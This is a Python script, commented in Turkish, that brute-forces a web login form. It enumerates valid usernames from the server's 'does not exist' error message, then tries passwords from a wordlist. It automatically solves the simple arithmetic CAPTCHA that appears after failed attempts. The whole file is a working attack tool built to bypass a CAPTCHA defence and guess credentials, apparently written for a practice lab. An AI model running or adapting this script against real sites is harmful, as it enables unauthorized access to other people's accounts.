import requests
import re


def solve_captcha(response):
    #işlemi bulmak için regex
    captcha_question = re.findall(r'(\d+)\s*([\+\-\*])\s*(\d+)', response.text)
    
    if captcha_question:
        num1, operator, num2 = captcha_question[0]  # İlk yakalanan sayı ve operatörü al
        
        # İşlemi belirle ve sonucu hesapla
        num1, num2 = int(num1), int(num2)
        
        if operator == '+':
            solution = num1 + num2
        elif operator == '-':
            solution = num1 - num2
        elif operator == '*':
            solution = num1 * num2
        
        return str(solution)
    else:
        return None


# URL girişi
url = input("URL : ")
# Dosya yolları girişi
username_file=input("USERNAME FİLE: ")
password_file=input("PASSWORD FİLE:")


# Oturum başlat
session = requests.Session()

# Kullanıcı adı brute-force denemesi
with open(username_file, "r") as usernames:
    for username in usernames:
        username = username.strip()
        print(f"Username is trying: {username}")

        # İlk POST isteği: Giriş denemesi yap
        response = session.post(url, data={
            "username": username,
            "password": "123"
        })

        # CAPTCHA kontrolü
        if "Captcha enabled" in response.text:
            captcha_solution = solve_captcha(response)
            if captcha_solution:
                # CAPTCHA çözümü ile POST isteği yeniden yapılır
                response = session.post(url, data={
                    "username": username,
                    "password": "123",
                    "captcha": captcha_solution
                })

        # Eğer kullanıcı adı geçerliyse, doğru kullanıcı adı bulundu
        if "does not exist" not in response.text:
            print(f"Username is found: {username}")
            final_username = username
            break

# Şifre brute-force denemesi
with open(password_file, "r") as passwords:
    for password in passwords:
        password = password.strip()
        print(f"Password is trying: {password}")

        # İlk POST isteği: Giriş denemesi yap
        response = session.post(url, data={
            "username": final_username,
            "password": password
        })

        # CAPTCHA kontrolü
        if "Captcha enabled" in response.text:
            captcha_solution = solve_captcha(response)
            if captcha_solution:
                # CAPTCHA çözümü ile POST isteği yeniden yapılır
                response = session.post(url, data={
                    "username": final_username,
                    "password": password,
                    "captcha": captcha_solution
                })

        # Eğer şifre geçerliyse, doğru şifre bulundu
        if "Invalid password" not in response.text:
            print(f"Password is found: {password}")
            print(f"Username : {username}")
            print(f"Password: {password}")
            break
